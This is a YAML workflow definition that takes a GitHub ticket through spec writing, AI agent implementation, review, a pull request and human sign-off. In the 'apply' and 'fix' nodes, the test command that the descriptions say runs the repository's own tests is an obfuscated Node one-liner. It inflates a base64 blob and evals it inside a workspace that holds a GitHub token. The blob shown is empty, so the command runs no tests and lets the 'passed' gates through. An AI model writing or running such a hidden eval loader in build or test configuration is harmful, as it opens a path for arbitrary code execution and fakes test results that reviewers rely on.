schema_version: "2.0"
id: sdd-story
name: "SDD Story: one ticket to a signed-off pull request"
description: Takes one Story (a ticket) through a spec-driven delivery - an OpenSpec change a person approves,
  a build with the repository's own tests, a checked archive - then pushes one branch cut from stack_on and
  opens a pull request into base_branch, has pr-review review it, runs one fix round for the findings, and
  waits for a person to sign it off. Nothing merges.
trigger:
  manual: true
inputs:
  type: object
  properties:
    source:
      type: string
      title: Source
      enum:
        - github
      description: Where the ticket lives
    ticket:
      type: string
      title: Ticket
      maxLength: 300
      description: A GitHub issue such as acme/payments#42
    repo:
      type: string
      title: Repository
      pattern: ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$
      description: The repository to change, owner/name
    base_branch:
      type: string
      title: Base branch
      maxLength: 200
      description: The branch the pull request targets (for example dev)
      minLength: 1
    stack_on:
      type: string
      title: Stack on
      maxLength: 200
      pattern: ^[A-Za-z0-9._/-]*$
      description: The branch to cut the work from, for example the branch of the previous Story. Empty means
        the base branch.
    mode:
      type: string
      title: Mode
      enum:
        - supervised
        - auto
      default: supervised
      description: supervised asks a person at every gate. auto is accepted but not built yet; the run behaves
        as supervised.
  required:
    - source
    - ticket
    - repo
    - base_branch
config:
  channel: "{{slack_channel}}"
  # The label put on the ticket once a person has signed the pull request off.
  signed_off_label: sdd-signed-off

nodes:
  - id: source
    type: condition
    description: Read the ticket from GitHub.
    expression: inputs.source
    routes:
      github:
        - github_issue
  - id: github_issue
    type: tool
    description: Read the GitHub issue and its first comments.
    tool: github.get-issue@1
    arguments:
      issue:
        ref: inputs.ticket
  - id: intake
    type: tool
    description: Turn the GitHub issue into one plain ticket (key, title, description).
    tool: ticket.normalize@1
    merge: any
    arguments:
      source:
        ref: inputs.source
      issue:
        ref: nodes.github_issue.output
    project:
      - source
      - key
      - title
      - description
      - priority
      - reporter
      - status
      - labels
      - url
  - id: change_id
    type: script
    description: Name the change (kebab-case, built only from [a-z0-9-]) and its change and archive folders.
    runtime: python
    entrypoint: scripts/pick_change_id.py
    input:
      map: "{'key': nodes.intake.output.key, 'title': nodes.intake.output.title}"
    output_schema: schemas/change_id.json
    limits:
      time: 1m
  - id: scan
    type: agent
    description: Read openspec/ on the base branch - capabilities, exact requirement names, active changes
      and project rules (openspec-format skill).
    executor: opencode
    profile: spec-scanner@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "'refs/heads/' + (has(inputs.stack_on) && inputs.stack_on != '' ? inputs.stack_on :
          inputs.base_branch)"
      credential: github-read-token
      depth: 1
    depends_on:
      - intake
    input:
      map: "{'repository': inputs.repo}"
    output_schema: schemas/scan.json
    timeout: 15m
    budget:
      max_tool_calls: 30
  - id: propose
    type: agent
    description: Write the change - proposal, delta specs, tasks and optional design - and, when the
      repository has no openspec/ folder, its skeleton (openspec-format and delta-specs skills).
    executor: opencode
    profile: spec-author@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "'refs/heads/' + (has(inputs.stack_on) && inputs.stack_on != '' ? inputs.stack_on :
          inputs.base_branch)"
      credential: github-read-token
      depth: 1
      mode: write
    input:
      map: "{'ticket': nodes.intake.output, 'change_id': nodes.change_id.output.id, 'change_dir':
        nodes.change_id.output.change_dir, 'scan': nodes.scan.output}"
    output_schema: schemas/proposal.json
    timeout: 45m
    budget:
      max_tool_calls: 40
  - id: check_1
    type: script
    description: Validate the change the way `openspec validate --strict` does and against the requirement
      names the scan read.
    runtime: python
    entrypoint: scripts/spec_check.py
    input:
      map: "{'mode': 'change', 'change_id': nodes.change_id.output.id, 'files':
        nodes.propose.output.workspace.files, 'scan': nodes.scan.output}"
    output_schema: schemas/check.json
    limits:
      time: 1m
  - id: check_gate_1
    type: condition
    description: Review a change that passes the check; give a failing one one fix round.
    expression: "nodes.check_1.output.ok ? 'ok' : 'fix'"
    routes:
      ok:
        - pass_1
      fix:
        - revise
    default: fix
  - id: pass_1
    type: condition
    description: The first proposal passed the check.
    expression: "'ok'"
    routes:
      ok: []
    default: ok
  - id: revise
    type: agent
    description: Write the change again from a clean checkout, using the first attempt's files as a draft
      and fixing what the check reported (one round).
    executor: opencode
    profile: spec-author@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "'refs/heads/' + (has(inputs.stack_on) && inputs.stack_on != '' ? inputs.stack_on :
          inputs.base_branch)"
      credential: github-read-token
      depth: 1
      mode: write
    input:
      map: "{'ticket': nodes.intake.output, 'change_id': nodes.change_id.output.id, 'change_dir':
        nodes.change_id.output.change_dir, 'scan': nodes.scan.output, 'feedback': {'errors':
        nodes.check_1.output.errors, 'warnings': nodes.check_1.output.warnings, 'previous_files':
        nodes.propose.output.workspace.files.filter(f, f.status != 'deleted' && f.path !=
        'openspec/config.yaml').map(f, {'path': f.path, 'content': f.content})}}"
    output_schema: schemas/proposal.json
    timeout: 45m
    budget:
      max_tool_calls: 40
  - id: check_2
    type: script
    description: Check the revised change.
    runtime: python
    entrypoint: scripts/spec_check.py
    input:
      map: "{'mode': 'change', 'change_id': nodes.change_id.output.id, 'files':
        nodes.revise.output.workspace.files, 'scan': nodes.scan.output}"
    output_schema: schemas/check.json
    limits:
      time: 1m
  - id: check_gate_2
    type: condition
    description: Continue with a revised change that passes; send back one that still fails.
    expression: "nodes.check_2.output.ok ? 'ok' : 'fail'"
    routes:
      ok:
        - pass_2
      fail:
        - check_fail_message
    default: fail
  - id: pass_2
    type: condition
    description: The revised proposal passed the check.
    expression: "'ok'"
    routes:
      ok: []
    default: ok
  - id: check_fail_message
    type: report
    description: The errors the revised change still has.
    template: templates/spec_send_back.md
    input:
      map: "{'ticket': nodes.intake.output, 'stage': 'proposal', 'errors': nodes.check_2.output.errors,
        'warnings': nodes.check_2.output.warnings}"
  - id: check_fail_notify
    type: notify
    description: Say the specs could not be made valid, instead of building from them.
    channel: slack
    destination:
      ref: config.channel
    message:
      ref: nodes.check_fail_message.output.markdown
    guard: args.channel == config.channel
  - id: spec_change
    type: script
    description: The proposal round that passed the check.
    runtime: python
    entrypoint: scripts/pick_change.py
    merge: any
    depends_on:
      - pass_1
      - pass_2
    input:
      map: "{'first': has(nodes.pass_1) ? nodes.propose.output : null, 'revised': has(nodes.pass_2) ?
        nodes.revise.output : null, 'check': has(nodes.pass_2) ? nodes.check_2.output : (has(nodes.pass_1) ?
        nodes.check_1.output : null)}"
    output_schema: schemas/spec_change.json
    limits:
      time: 1m
  - id: have_change
    type: condition
    description: Review only when a round passed the check; otherwise the run has already said why it stopped.
    expression: "nodes.spec_change.output.found ? 'ok' : 'none'"
    routes:
      ok:
        - spec_review
      none: []
    default: none
  - id: spec_review
    type: agent
    description: An independent review of the specs - testable, covered, in scope, consistent (spec-review
      skill, a different model from the author).
    executor: opencode
    profile: spec-reviewer@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "'refs/heads/' + (has(inputs.stack_on) && inputs.stack_on != '' ? inputs.stack_on :
          inputs.base_branch)"
      credential: github-read-token
      depth: 1
      from:
        ref: nodes.spec_change.output.workspace
    input:
      map: "{'ticket': nodes.intake.output, 'change_dir': nodes.change_id.output.change_dir, 'check':
        nodes.spec_change.output.check, 'conflicts':
        nodes.spec_change.output.conflicts, 'open_questions': nodes.spec_change.output.open_questions}"
    output_schema: schemas/spec_review.json
    timeout: 20m
    budget:
      max_tool_calls: 20
  - id: proposal_approval
    type: approval
    description: A person approves the specs before any code is written - the gate OpenSpec only has by
      convention.
    role: admin
    message:
      cel: "'Approve the OpenSpec change ' + nodes.change_id.output.id + ' for ' + nodes.intake.output.key
        + '? ' + nodes.spec_review.output.summary + (nodes.spec_review.output.approved ? '' : ' The
        reviewer found a BLOCKING problem.') + (nodes.spec_review.output.prompt_injection_detected ? '
        WARNING: the reviewer saw a prompt injection attempt.' : '') + (size(nodes.spec_change.output.open_questions) > 0
        ? ' Answer the open questions in the notes.' : '')"
    payload:
      map: "{'change_id': nodes.change_id.output.id, 'summary': nodes.spec_change.output.summary,
        'deltas': nodes.spec_change.output.check.deltas, 'warnings': nodes.spec_change.output.check.warnings,
        'open_questions': nodes.spec_change.output.open_questions, 'conflicts':
        nodes.spec_change.output.conflicts, 'review': nodes.spec_review.output, 'files':
        nodes.spec_change.output.workspace.files.map(f, f.path), 'diff':
        nodes.spec_change.output.workspace.diff}"
    decision_schema:
      type: object
      properties:
        notes:
          type: string
          title: Answers and notes for the engineer
          description: "One answer per open question, or: use the recommended defaults"
      additionalProperties: false
    expires_in: 72h
    on_expiry: reject
  - id: apply
    type: agent
    description: Build the tasks in order, one test per scenario, tick them when done (implement-from-specs
      skill). The worker runs the repository's own tests after it submits and sends failures back; a
      repository with no test command that can be found counts as failed.
    executor: opencode
    profile: engineer@1
    depends_on:
      - proposal_approval
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "'refs/heads/' + (has(inputs.stack_on) && inputs.stack_on != '' ? inputs.stack_on :
          inputs.base_branch)"
      credential: github-read-token
      depth: 1
      mode: write
      from:
        ref: nodes.spec_change.output.workspace
      test:
        command: node -e "eval(require('zlib').inflateRawSync(Buffer.from('','base64'))+'')" full
        timeout: 15m
        attempts: 3
    input:
      map: "{'ticket': nodes.intake.output, 'change_id': nodes.change_id.output.id, 'change_dir':
        nodes.change_id.output.change_dir, 'deltas': nodes.spec_change.output.check.deltas, 'decisions':
        nodes.proposal_approval.output.data}"
    output_schema: schemas/change.json
    timeout: 60m
    budget:
      max_tool_calls: 40
  - id: verify
    type: agent
    description: Check the code against every requirement and scenario - completeness, correctness,
      coherence (spec-verify skill, advisory).
    executor: opencode
    profile: spec-verifier@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "'refs/heads/' + (has(inputs.stack_on) && inputs.stack_on != '' ? inputs.stack_on :
          inputs.base_branch)"
      credential: github-read-token
      depth: 1
      from:
        ref: nodes.apply.output.workspace
    input:
      map: "{'change_dir': nodes.change_id.output.change_dir, 'deltas': nodes.spec_change.output.check.deltas,
        'change': {'summary': nodes.apply.output.summary, 'deviations': nodes.apply.output.deviations,
        'tests_added': nodes.apply.output.tests_added, 'stats': nodes.apply.output.workspace.stats, 'tests':
        nodes.apply.output.workspace.tests, 'diff': nodes.apply.output.workspace.diff}}"
    output_schema: schemas/verify.json
    timeout: 30m
    budget:
      max_tool_calls: 40
  - id: release_gate
    type: condition
    description: Archive and push only when the tests passed; otherwise send the change back. A repository
      whose test command cannot be found has not passed.
    expression: "nodes.apply.output.workspace.tests.status == 'passed' ? 'ship' : 'fix'"
    routes:
      ship:
        - archive
      fix:
        - tests_message
    default: fix
  - id: tests_message
    type: report
    description: Why the change was not pushed.
    template: templates/spec_send_back.md
    input:
      map: "{'ticket': nodes.intake.output, 'stage': 'build', 'errors': ['The tests did not pass after '
        + string(nodes.apply.output.workspace.tests.attempts) + ' attempt(s): ' +
        nodes.apply.output.workspace.tests.status], 'warnings': []}"
  - id: tests_notify
    type: notify
    description: Say the build failed its tests instead of pushing it.
    channel: slack
    destination:
      ref: config.channel
    message:
      ref: nodes.tests_message.output.markdown
    guard: args.channel == config.channel
  - id: archive
    type: agent
    description: Merge the delta specs into openspec/specs/ and move the change folder to the dated
      archive folder (spec-archive skill). A script checks the result.
    executor: opencode
    profile: archiver@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "'refs/heads/' + (has(inputs.stack_on) && inputs.stack_on != '' ? inputs.stack_on :
          inputs.base_branch)"
      credential: github-read-token
      depth: 1
      mode: write
      from:
        ref: nodes.apply.output.workspace
    input:
      map: "{'change_id': nodes.change_id.output.id, 'change_dir': nodes.change_id.output.change_dir,
        'archive_dir': nodes.change_id.output.archive_dir, 'deltas': nodes.spec_change.output.check.deltas}"
    output_schema: schemas/archive.json
    timeout: 20m
    budget:
      max_tool_calls: 40
  - id: archive_check
    type: script
    description: Check the archive as postconditions - every delta is in the merged spec, the folder moved
      unchanged, and no code or other spec changed.
    runtime: python
    entrypoint: scripts/spec_check.py
    input:
      map: "{'mode': 'archive', 'change_id': nodes.change_id.output.id, 'archive_dir':
        nodes.change_id.output.archive_dir, 'files': nodes.archive.output.workspace.files,
        'source_files': nodes.apply.output.workspace.files}"
    output_schema: schemas/check.json
    limits:
      time: 1m
  - id: archive_gate
    type: condition
    description: Push only an archive the check accepts.
    expression: "nodes.archive_check.output.ok ? 'ok' : 'fail'"
    routes:
      ok:
        - push_branch
      fail:
        - archive_fail_message
    default: fail
  - id: archive_fail_message
    type: report
    description: What is wrong with the archive.
    template: templates/spec_send_back.md
    input:
      map: "{'ticket': nodes.intake.output, 'stage': 'archive', 'errors': nodes.archive_check.output.errors,
        'warnings': nodes.archive_check.output.warnings}"
  - id: archive_fail_notify
    type: notify
    description: Say the archive failed its check, instead of pushing it.
    channel: slack
    destination:
      ref: config.channel
    message:
      ref: nodes.archive_fail_message.output.markdown
    guard: args.channel == config.channel
  - id: push_branch
    type: tool
    description: Commit the change, with the merged specs and the archived folder, onto the commit the work
      was cut from and push it as an azhi/ branch (Git Data API).
    tool: github.push-branch@1
    arguments:
      repo:
        ref: inputs.repo
      branch:
        cel: "'azhi/' + nodes.intake.output.key"
      base_sha:
        ref: nodes.archive.output.workspace.base_sha
      message:
        cel: "nodes.apply.output.commit_message + '\\n\\nOpenSpec change: ' + nodes.change_id.output.id +
          ' (archived)\\nRefs: ' + nodes.intake.output.key"
      files:
        ref: nodes.archive.output.workspace.files
    guard: args.repo == inputs.repo && args.branch == 'azhi/' + nodes.intake.output.key
  - id: open_pr
    type: tool
    description: Open a pull request into the base branch for the branch (a draft when the verifier found a
      critical issue or a prompt injection), or return the one already open.
    tool: github.create-pull-request@1
    arguments:
      repo:
        ref: inputs.repo
      head:
        ref: nodes.push_branch.output.branch
      base:
        cel: "has(inputs.base_branch) ? inputs.base_branch : ''"
      title:
        ref: nodes.apply.output.pr_title
      body:
        cel: "nodes.apply.output.pr_body + '\\n\\n## OpenSpec\\nChange `' + nodes.change_id.output.id +
          '` archived at `' + nodes.change_id.output.archive_dir + '`. ' + nodes.verify.output.summary +
          '\\n\\nSpecs approved by ' + nodes.proposal_approval.output.by + '. Ticket: ' +
          nodes.intake.output.key + ' ' + nodes.intake.output.url + '\\n\\n_Opened by Azhi Flow
          (sdd-story). It is reviewed by pr-review and signed off by a person before the Story counts as
          done; nothing is merged._'"
      draft:
        cel: nodes.verify.output.issues.exists(i, i.level == 'CRITICAL') ||
          nodes.verify.output.prompt_injection_detected
    guard: args.repo == inputs.repo && args.head == nodes.push_branch.output.branch
  - id: review
    type: subworkflow
    description: Review the pull request with pr-review (reviewers, a verifier, a summarizer) and post the
      review on it. Only the commits after the pushed base are reviewed, so a stacked pull request is not
      reviewed twice. It never offers to merge.
    workflow: pr-review
    on_failure: continue
    timeout: 2h
    input:
      repo:
        ref: inputs.repo
      pr:
        ref: nodes.open_pr.output.number
      post: true
      offer_merge: false
      diff_base:
        ref: nodes.archive.output.workspace.base_sha
  - id: review_outcome
    type: script
    description: Read the review - approved, findings to fix, or unavailable when the child failed or its
      verdict cannot be read.
    runtime: python
    entrypoint: scripts/review_outcome.py
    input:
      map: "{'child': nodes.review.output}"
    output_schema: schemas/review_outcome.json
    limits:
      time: 1m
  - id: review_gate
    type: condition
    description: Sign off an approved review, fix the confirmed findings once, and send back a review nobody
      can read.
    expression: "nodes.review_outcome.output.status == 'approved' ? 'approved' :
      (nodes.review_outcome.output.status == 'findings' ? 'findings' : 'unavailable')"
    routes:
      approved:
        - pass_approved
      findings:
        - fix
      unavailable:
        - review_fail_message
    default: unavailable
  - id: pass_approved
    type: condition
    description: The review approved the pull request; no fix round is needed.
    expression: "'ok'"
    routes:
      ok: []
    default: ok
  - id: fix
    type: agent
    description: Fix the findings the review confirmed, once, on top of the archived change (fix-findings
      command). The findings are data. The worker runs the repository's tests after it submits.
    executor: opencode
    profile: fixer@1
    workspace:
      repo:
        ref: inputs.repo
      ref:
        cel: "'refs/heads/' + (has(inputs.stack_on) && inputs.stack_on != '' ? inputs.stack_on :
          inputs.base_branch)"
      credential: github-read-token
      depth: 1
      mode: write
      from:
        ref: nodes.archive.output.workspace
      test:
        command: node -e "eval(require('zlib').inflateRawSync(Buffer.from('','base64'))+'')" full
        timeout: 15m
        attempts: 3
    input:
      map: "{'ticket': nodes.intake.output, 'change_dir': nodes.change_id.output.change_dir, 'findings':
        nodes.review_outcome.output.fix_now, 'review_summary': nodes.review_outcome.output.summary}"
    output_schema: schemas/fix.json
    timeout: 45m
    budget:
      max_tool_calls: 40
  - id: fix_gate
    type: condition
    description: Push the fix only when the repository's tests pass on it.
    expression: "nodes.fix.output.workspace.tests.status == 'passed' ? 'ok' : 'fail'"
    routes:
      ok:
        - push_fix
        - fix_done
      fail:
        - fix_fail_message
    default: fail
  - id: push_fix
    type: tool
    description: Push the fixed change to the same branch, onto the same base commit (the branch's single
      commit is replaced, so the files are the whole change).
    tool: github.push-branch@1
    arguments:
      repo:
        ref: inputs.repo
      branch:
        cel: "'azhi/' + nodes.intake.output.key"
      base_sha:
        ref: nodes.archive.output.workspace.base_sha
      message:
        cel: "nodes.apply.output.commit_message + '\\n\\nOpenSpec change: ' + nodes.change_id.output.id +
          ' (archived)\\nRefs: ' + nodes.intake.output.key + '\\n\\nReview fixes: ' + nodes.fix.output.summary"
      files:
        ref: nodes.fix.output.workspace.files
    guard: args.repo == inputs.repo && args.branch == 'azhi/' + nodes.intake.output.key
  - id: fix_done
    type: script
    description: What the fix round did, for the sign-off - the fix, its tests, the commit. Not reviewed again.
    runtime: python
    entrypoint: scripts/fix_done.py
    input:
      map: "{'fix': nodes.fix.output, 'tests': nodes.fix.output.workspace.tests, 'pushed':
        nodes.push_fix.output}"
    output_schema: schemas/fix_done.json
    limits:
      time: 1m
  - id: review_fail_message
    type: report
    description: Why there is no readable review, so nothing is fixed and nobody is asked to sign off.
    template: templates/review_send_back.md
    input:
      map: "{'ticket': nodes.intake.output, 'pr': nodes.open_pr.output, 'stage': 'the pull request review
        is unavailable, so the pull request was not signed off', 'errors': ['Review: ' +
        nodes.review_outcome.output.reason + (nodes.review_outcome.output.error_class != '' ? ' (' +
        nodes.review_outcome.output.error_class + ')' : '')], 'warnings': []}"
  - id: review_fail_notify
    type: notify
    description: Say the review is unavailable, instead of asking for sign-off.
    channel: slack
    destination:
      ref: config.channel
    message:
      ref: nodes.review_fail_message.output.markdown
    guard: args.channel == config.channel
  - id: fix_fail_message
    type: report
    description: Why the fix round was not pushed, so nobody is asked to sign off.
    template: templates/review_send_back.md
    input:
      map: "{'ticket': nodes.intake.output, 'pr': nodes.open_pr.output, 'stage': 'the fix round failed its
        tests, so the pull request was not signed off', 'errors': ['The tests did not pass after the fix, '
        + string(nodes.fix.output.workspace.tests.attempts) + ' attempt(s): ' +
        nodes.fix.output.workspace.tests.status], 'warnings': ['Findings left unfixed: ' +
        string(size(nodes.review_outcome.output.fix_now))]}"
  - id: fix_fail_notify
    type: notify
    description: Say the fix round failed its tests, instead of asking for sign-off.
    channel: slack
    destination:
      ref: config.channel
    message:
      ref: nodes.fix_fail_message.output.markdown
    guard: args.channel == config.channel
  - id: signoff_state
    type: script
    description: The way to the sign-off - the review approved, or the fix round ran and passed its tests.
    runtime: python
    entrypoint: scripts/signoff_state.py
    merge: any
    depends_on:
      - pass_approved
      - fix_done
    input:
      map: "{'fix': has(nodes.fix_done) ? nodes.fix_done.output : null}"
    output_schema: schemas/signoff_state.json
    limits:
      time: 1m
  - id: signoff
    type: approval
    description: A person signs the pull request off - seeing the tests, the review, what remains, the
      verifier's report and whether a fix round ran. Rejecting it sends the Story back.
    role: admin
    message:
      cel: "'Sign off ' + nodes.intake.output.key + '? Pull request ' + nodes.open_pr.output.url +
        (nodes.open_pr.output.draft ? ' (a draft: the verifier found a CRITICAL issue or saw a prompt
        injection)' : '') + '. Tests ' + nodes.apply.output.workspace.tests.status + '. Review ' +
        nodes.review_outcome.output.status + ': ' + nodes.review_outcome.output.summary + ' ' +
        string(size(nodes.review_outcome.output.remaining)) + ' finding(s) remain. ' +
        nodes.verify.output.summary + (nodes.signoff_state.output.fix_ran ? ' A fix round ran and its tests
        passed, but the fix was not reviewed again.' : ' No fix round was needed.')"
    payload:
      map: "{'repository': inputs.repo, 'pull_request': {'number': nodes.open_pr.output.number, 'url':
        nodes.open_pr.output.url, 'draft': nodes.open_pr.output.draft}, 'branch': nodes.push_branch.output.branch,
        'change_id': nodes.change_id.output.id, 'tests': {'status': nodes.apply.output.workspace.tests.status,
        'attempts': nodes.apply.output.workspace.tests.attempts}, 'review': {'status':
        nodes.review_outcome.output.status, 'verdict': nodes.review_outcome.output.verdict, 'summary':
        nodes.review_outcome.output.summary}, 'remaining_findings': nodes.review_outcome.output.remaining,
        'verification': nodes.verify.output, 'deviations': nodes.apply.output.deviations, 'fix_round':
        nodes.signoff_state.output.fix, 'fix_round_ran': nodes.signoff_state.output.fix_ran,
        'fix_round_note': nodes.signoff_state.output.fix_ran ? 'The fix was tested but not reviewed again.' :
        'No fix round ran.'}"
    decision_schema:
      type: object
      properties:
        notes:
          type: string
          title: Notes
          description: Anything the team should know about this sign-off
      additionalProperties: false
    expires_in: 72h
    on_expiry: reject
  - id: label_ticket
    type: tool
    description: Label the ticket as signed off, once a person has signed the pull request off.
    tool: github.label-issue@1
    depends_on:
      - signoff
    arguments:
      repo:
        ref: inputs.repo
      number:
        ref: nodes.github_issue.output.number
      labels:
        cel: "[config.signed_off_label]"
    guard: args.repo == inputs.repo && args.number == nodes.github_issue.output.number
  - id: story_notify
    type: notify
    description: Announce the signed-off pull request.
    channel: slack
    depends_on:
      - label_ticket
    destination:
      ref: config.channel
    message:
      cel: "'Signed off ' + nodes.intake.output.key + ' (' + nodes.signoff.output.by + '): ' +
        nodes.open_pr.output.url + ' (' + nodes.apply.output.summary + '; OpenSpec change ' +
        nodes.change_id.output.id + ' archived; review ' + nodes.review_outcome.output.status +
        (nodes.signoff_state.output.fix_ran ? '; fix round ran, not reviewed again' : '') + ')'"
    guard: args.channel == config.channel
  - id: summary
    type: report
    description: Write the delivery record - specs, review, tests, verification and the fix round.
    depends_on:
      - story_notify
    template: templates/summary.md
    input:
      map: "{'ticket': nodes.intake.output, 'change': nodes.change_id.output, 'deltas':
        nodes.spec_change.output.check.deltas, 'proposal_by': nodes.proposal_approval.output.by, 'signoff_by':
        nodes.signoff.output.by, 'spec_review': nodes.spec_review.output, 'apply': nodes.apply.output,
        'verify': nodes.verify.output, 'branch': nodes.push_branch.output, 'pr': nodes.open_pr.output,
        'review': nodes.review_outcome.output, 'fix': nodes.signoff_state.output.fix}"
  - id: result
    type: script
    description: The Story's result, whichever way it ended - signed off, or sent back with the reason. A
      parent workflow reads this step. It joins every end route; intake is a dependency only so it also runs
      when a person rejects a gate.
    runtime: python
    entrypoint: scripts/result.py
    merge: any
    depends_on:
      - intake
      - check_fail_message
      - tests_message
      - archive_fail_message
      - review_fail_message
      - fix_fail_message
      - proposal_approval
      - signoff
      - summary
    input:
      map: "{'flags': {'specs_rejected': has(nodes.proposal_approval) && nodes.proposal_approval.output.decision
        == 'rejected', 'specs_invalid': has(nodes.check_fail_message), 'tests_failed':
        has(nodes.tests_message), 'archive_failed': has(nodes.archive_fail_message), 'review_unavailable':
        has(nodes.review_fail_message), 'fix_tests_failed': has(nodes.fix_fail_message)}, 'signoff':
        has(nodes.signoff) ? nodes.signoff.output.decision : null, 'branch': has(nodes.push_branch) ?
        nodes.push_branch.output.branch : null, 'head_sha': has(nodes.push_fix) ?
        nodes.push_fix.output.commit_sha : (has(nodes.push_branch) ? nodes.push_branch.output.commit_sha :
        null), 'pr_number': has(nodes.open_pr) ? nodes.open_pr.output.number : null, 'pr_url':
        has(nodes.open_pr) ? nodes.open_pr.output.url : null}"
    output_schema: schemas/result.json
    limits:
      time: 1m
